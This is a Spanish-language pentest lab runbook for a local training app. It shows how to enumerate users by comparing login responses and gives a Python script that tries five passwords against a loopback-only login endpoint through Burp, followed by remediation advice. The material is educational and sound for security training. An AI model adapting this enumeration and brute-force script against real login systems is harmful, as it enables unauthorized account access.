# F1-13 — Broken Authentication: enumeración y fuerza bruta controlada

> **Entorno multi-OS del hito:** el código puede desarrollarse en Windows o Linux; el contenedor de referencia es Linux y Docker Compose, el objetivo y las herramientas de pentest se ejecutan dentro de Debian 13 XFCE en la VM del laboratorio. Los comandos de los runbooks se ejecutan desde esa VM y el objetivo es exclusivamente `http://127.0.0.1:5080` dentro del invitado.

## Meta y límites

Mostrar respuestas que permitan distinguir una cuenta existente de una inexistente y demostrar que el login del perfil Red Team no aplica rate limiting/bloqueo. Usar cuentas desechables, volumen pequeño y solicitudes secuenciales. No probar contraseñas personales ni cuentas reales.

## Requisitos previos

- Usuario ficticio conocido y usuario ficticio inexistente.
- Una contraseña de prueba incorrecta y, para validar condición de éxito, una contraseña de laboratorio conocida.
- Script Python del runbook, Burp Proxy listener local y cuenta `cliente-brute`; el código verifica que el host sea exactamente `127.0.0.1`.

## Procedimiento

1. En Burp Proxy, enviar una solicitud válida de forma al historial, pero usando usuario inexistente y password incorrecta. Forma JSON de referencia:

   ```http
   POST /api/auth/login HTTP/1.1
   Host: 127.0.0.1:5080
   Content-Type: application/json

   {"username":"no-existe-lab","password":"Incorrecta!"}
   ```

2. Repetir el request con `cliente-brute` y password incorrecta. Comparar status, cuerpo, longitud y tiempo; la diferencia debe revelar la existencia del usuario.
3. Para satisfacer explícitamente el requisito de script, crear `auth_bruteforce.py` local con el siguiente límite incorporado: máximo cinco passwords, sin concurrencia, host fijo y proxy de Burp. El seed de `cliente-brute` debe usar `LabPass2026!`.

   ```python
   # Prueba deliberadamente limitada al Mini Shop local.
   from urllib.parse import urlparse
   import requests

   target = "http://127.0.0.1:5080/api/auth/login"
   if urlparse(target).hostname != "127.0.0.1":
       raise SystemExit("Cancelado: el target no es loopback")

   passwords = ["incorrecta1", "incorrecta2", "Admin2026!", "Cliente2026!", "LabPass2026!"]
   session = requests.Session()
   session.trust_env = False
   session.proxies = {"http": "http://127.0.0.1:8080"}  # Burp Proxy listener local

   for index, password in enumerate(passwords, start=1):
       response = session.post(
           target,
           json={"username": "cliente-brute", "password": password},
           timeout=5,
           allow_redirects=False,
       )
       print(index, response.status_code, len(response.content))
       if response.status_code == 200:
           print("Credencial de laboratorio aceptada en intento", index)
           break
   ```

   Instalar `requests` en un entorno virtual si hace falta: `python3 -m venv .venv-auth` y `./.venv-auth/bin/pip install requests`; ejecutar `./.venv-auth/bin/python auth_bruteforce.py`. Con Burp en `127.0.0.1:8080`, la solicitud aparece en Proxy HTTP history.

4. Comparar en Burp las cinco solicitudes que el script envió a través del proxy; la fila correcta debe ser reconocible por status/cuerpo/tamaño y el servidor no debe bloquear solicitudes posteriores dentro del perfil Red.
5. Detener tras una tanda. No editar la lista para añadir más claves, no aumentar concurrencia ni tiempo. Reiniciar la cuenta/seed al cerrar la prueba.

## Evidencia y aceptación

- Comparación de respuesta para usuario válido/no válido que justifique enumeración.
- Conteo acotado de solicitudes y resultado de intentos; request/responses sanitizados.
- Prueba de que se usaron cuentas ficticias y el host fue loopback.
- No guardar la lista completa de contraseñas en artefactos; basta describir que era una lista corta sintética.

## Impacto y remediación a reportar

Explicar el riesgo de identificar cuentas y automatizar intentos contra la autenticación. Recomendar respuestas uniformes, hash robusto, rate limiting Redis, bloqueo tras cinco fallos según política y segundo factor TOTP (alcance de Fase 2).
